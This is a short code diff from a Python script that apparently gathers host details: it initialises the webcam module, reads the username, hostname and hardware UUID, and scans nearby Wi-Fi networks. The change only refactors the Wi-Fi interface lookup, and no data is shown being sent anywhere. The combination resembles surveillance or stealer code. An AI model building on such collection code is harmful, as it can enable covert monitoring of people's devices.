@@ -53,7 +53,8 @@ pygame.camera.init()
 username = str(os.getenv("USERNAME"))
 hostname = str(os.environ['COMPUTERNAME'])
 hwid = str(subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode("utf-8"))
-iface = pywifi.PyWiFi().interfaces()[0] if pywifi.PyWiFi().interfaces() is not None else None
+wifi_interfaces = pywifi.PyWiFi().interfaces()
+iface = wifi_interfaces[0] if wifi_interfaces else None
 if iface is not None:
     iface.scan()
     for result in iface.scan_results():
